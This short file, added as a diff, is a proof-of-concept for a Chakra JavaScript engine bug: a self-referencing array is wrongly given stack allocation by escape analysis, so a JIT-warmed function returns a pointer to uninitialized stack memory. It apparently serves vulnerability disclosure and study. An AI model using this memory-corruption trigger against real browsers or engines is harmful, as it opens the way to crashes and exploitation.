@@ -1,0 +1,23 @@
+/*
+Escape analysis: https://en.wikipedia.org/wiki/Escape_analysis
+
+Chakra fails to detect if "tmp" escapes the scope, allocates it to the stack. This may lead to dereference uninitialized stack values.
+
+PoC:
+*/
+
+function opt() {
+    let tmp = [];
+    tmp[0] = tmp;
+    return tmp[0];
+}
+
+function main() {
+    for (let i = 0; i < 0x1000; i++) {
+        opt();
+    }
+
+    print(opt());  // deref uninitialized stack pointers!
+}
+
+main();
